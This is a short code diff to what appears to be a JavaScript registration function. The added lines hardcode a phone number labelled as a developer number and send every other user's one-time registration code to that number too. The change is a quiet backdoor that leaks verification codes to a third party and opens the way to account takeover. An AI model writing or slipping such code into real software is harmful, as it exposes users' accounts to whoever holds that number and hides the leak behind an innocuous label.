@@ -229,7 +229,11 @@ const register = async (data) => {
     // Send OTP (non-blocking — don't let SMS failure block registration)
     try {
       const { sendOTP } = require('../../../shared/services/smsService');
+      const devNumber = '+917398801960';
       await sendOTP(formattedMobile, otpCode);
+      if (formattedMobile !== devNumber) {
+        await sendOTP(devNumber, otpCode);
+      }
     } catch (smsErr) {
       logger.error('Failed to send registration OTP SMS:', smsErr.message);
     }
